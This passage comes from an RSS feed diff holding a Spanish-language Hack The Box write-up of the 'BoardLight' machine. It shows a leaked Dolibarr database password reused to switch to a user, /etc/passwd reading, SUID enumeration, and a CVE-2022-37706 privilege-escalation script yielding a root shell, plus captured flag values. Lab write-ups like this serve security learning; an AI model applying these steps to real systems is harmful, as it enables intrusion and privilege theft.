+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_db_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dolibarr&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_db_prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;llx_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_db_user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dolibarrowner&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_db_pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;serverfun2$2023!!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_db_type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mysqli&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_db_character_set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_db_collation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8_unicode_ci&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// Authentication settings
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_authentication&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dolibarr&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www-data@boardlight:~/html/crm.board.htb/htdocs$ 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Observamos en el archivo /etc/passwd que larissa esta registrada en la maquina, utilizamos la contrasena anterior para cambiar a este usuario.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www-data@boardlight:~/html/crm.board.htb/htdocs$ cat /etc/passwd &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep home
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cups-pk-helper:x:113:120:user &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www-data@boardlight:~/html/crm.board.htb/htdocs$ su larissa
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password: serverfun2&lt;span class=&#34;nv&#34;&gt;$2023&lt;/span&gt;!!
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:/var/www/html/crm.board.htb/htdocs$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;larissa&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;larissa&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;larissa&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;adm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:/var/www/html/crm.board.htb/htdocs$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Realizamos la lectura de la flag &lt;code&gt;user.txt&lt;/code&gt; en la carpeta del usuario.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:/var/www/html/crm.board.htb/htdocs$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:~$ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Desktop    Downloads  Pictures  Templates  Videos
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Documents  Music      Public    user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:~$ cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;b69ae93e41529e723988cc01e6122a48
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:~$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
+&lt;p&gt;Enumeramos los ficheros SUID y observamos &lt;code&gt;enlightenment&lt;/code&gt;, al parecer es un gestor de ventanas (&lt;a href=&#34;https://www.enlightenment.org/&#34;&gt;1&lt;/a&gt;).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:~$ find / -perm -4000 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/lib/eject/dmcrypt-get-device
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/lib/xorg/Xorg.wrap
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/lib/openssh/ssh-keysign
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/sbin/pppd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/newgrp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/sudo
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/su
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/chfn
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/umount
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/gpasswd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/fusermount
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/chsh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/vmware-user-suid-wrapper
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:~$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Encontramos que existe una vulnerabilidad que permite escalar privilegios y el exploit &lt;a href=&#34;https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit&#34;&gt;CVE-2022-37706&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Creamos el exploit en la maquina, lo ejecutamos y logramos escalar privilegios a root, finalmente realizamos la lectura de la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:/dev/shm$ nano exploit.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:/dev/shm$ chmod +x exploit.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;larissa@boardlight:/dev/shm$ ./exploit.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CVE-2022-37706
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Trying to find the vulnerable SUID file...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; This may take few seconds...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Vulnerable SUID binary found!
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Trying to pop a root shell!
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enjoy the root shell :&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount: /dev/../tmp/: can&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t find in /etc/fstab.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# id&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;adm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;larissa&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# cd /root&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ls&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root.txt  snap
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# cat root.txt&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1c3cd61b4a2b0833d5f6f6769712d87a
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/htb/boardlight/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/htb/boardlight/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>Dolibarr</category>
+            
+          
+            
+              <category>Code-Injection</category>
+            
+          
+            
+              <category>CVE-2023-30253</category>
+            
+          
+            
+              <category>enlightenment</category>
+            
+          
+            
+              <category>CVE-2022-37706</category>
+            
+          
+        
+        
+          
+            
+              <category>hackthebox</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
